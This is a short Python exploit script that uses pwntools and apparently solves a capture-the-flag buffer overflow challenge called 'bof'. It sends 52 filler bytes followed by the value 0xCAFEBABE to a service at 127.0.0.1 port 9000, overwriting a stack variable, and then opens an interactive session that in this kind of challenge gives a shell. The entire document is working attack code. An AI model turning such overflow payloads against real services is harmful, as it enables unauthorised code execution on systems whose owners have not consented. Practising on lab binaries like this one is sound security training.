from pwn import *

context.log_level = "debug"

payload = b"A" * 52
payload += p32(0xCAFEBABE)

# Set `stdin=PTY` so LIBC sees a TTY and flushes the prompt before input.
# p = process(b"./bof", stdin=PTY)
p = remote(b"127.0.0.1", 9000)
# p.recvuntil(b"overflow me : ") # Remote has already printed "overflow me : " and is waiting for input
p.sendline(payload)
p.interactive()
